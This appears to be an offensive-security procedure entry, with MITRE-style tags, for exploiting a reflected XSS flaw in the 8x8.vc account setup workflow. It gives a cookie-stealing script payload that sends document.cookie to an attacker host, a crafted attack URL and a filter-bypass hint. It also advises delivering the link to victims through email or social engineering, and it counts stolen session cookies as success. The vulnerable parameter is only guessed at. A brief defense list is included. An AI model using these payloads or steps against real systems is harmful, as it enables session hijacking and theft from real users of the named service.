---
id: proc-reflected-xss-injection-8x8
tags:
  - xss
  - reflected-xss
  - javascript-injection
  - session-hijacking
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:38.333Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Script-via-Reflected-XSS-in-Account-Setup

## Summary

This procedure exploits a reflected cross-site scripting (XSS) vulnerability in the 8x8.vc account setup workflow by injecting malicious JavaScript into user inputs, which are then reflected back unsanitized in the server's response. Successful exploitation allows arbitrary code execution in the victim's browser, facilitating theft of session cookies, tokens, or other sensitive data.

## Description

The vulnerability arises from insufficient input sanitization or output encoding in the account setup process. Attackers can craft a malicious URL or form submission containing a script payload (e.g., in a parameter like 'username' or 'redirect'). When the victim accesses the link or submits the form, the server echoes the input directly into the HTML response, executing the script in the browser's context. This can lead to session hijacking, keylogging, or phishing overlays. The attack requires no authentication and relies on social engineering to deliver the payload, typically via email or malicious links. Expected outcomes include access to the victim's session data, enabling further unauthorized actions on the 8x8.vc platform.

## Requirements

1. Public access to the 8x8.vc web application and its account setup endpoint
2. Knowledge of the vulnerable parameter (inferred as part of the setup form inputs)
3. Ability to craft and host attacker-controlled endpoints for data exfiltration (e.g., a simple web server)
4. Victim interaction with the crafted link or form

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., using HTML entity encoding for user inputs)
- Deploy Content Security Policy (CSP) headers to restrict script execution
- Use Web Application Firewalls (WAFs) to detect and block common XSS payloads
- Monitor for anomalous JavaScript execution or unexpected outbound requests from browsers
- Educate users on phishing risks and validate URLs before clicking

## Objectives

1. Inject and reflect malicious JavaScript to execute in the victim's browser
2. Steal session cookies or other client-side data for hijacking
3. Demonstrate the vulnerability's impact without causing real harm (e.g., via proof-of-concept alert)

## Instructions

### Step 1: Identify the Reflection Point

**Context**: Locate the input field in the account setup workflow where user data is reflected back without sanitization. This is typically a GET parameter in the URL or a POST form field.

Navigate to https://8x8.vc and start the account setup process. Inspect the network requests using browser developer tools to identify parameters like 'email', 'name', or 'token' that appear unsanitized in the response HTML.

**Expected Output**: Confirmation that input is echoed back, e.g., entering 'test' results in 'test' appearing directly in the page source without encoding.

### Step 2: Craft the Malicious Payload

**Context**: Create a JavaScript payload that executes upon reflection. Start with a benign test like an alert, then escalate to data exfiltration.

Use a payload such as: `<script>alert('XSS')</script>` for testing, or for exfiltration: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`.

Encode if necessary to bypass basic filters, e.g., using `javascript:alert(1)` in event handlers if applicable.

**Expected Output**: The payload is prepared and ready for injection into the vulnerable parameter.

### Step 3: Deliver and Trigger the Payload

**Context**: Send the crafted input to the server via a malicious link or form submission to trigger reflection and execution.

Construct a URL like: `https://8x8.vc/setup?param=<script>alert(document.cookie)</script>`. Share this link with the victim via email or social engineering. Upon access, the server reflects the script, executing it in their browser.

For POST-based reflection, use a form with hidden fields containing the payload and submit it.

**Expected Output**: Script execution, such as an alert box or data sent to the attacker's server (verifiable via access logs).

**Success Indicators**:
- Payload reflects and executes without errors
- Access to victim cookies or session data
- No CSP or WAF blocks the execution

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web-vulnerability]]
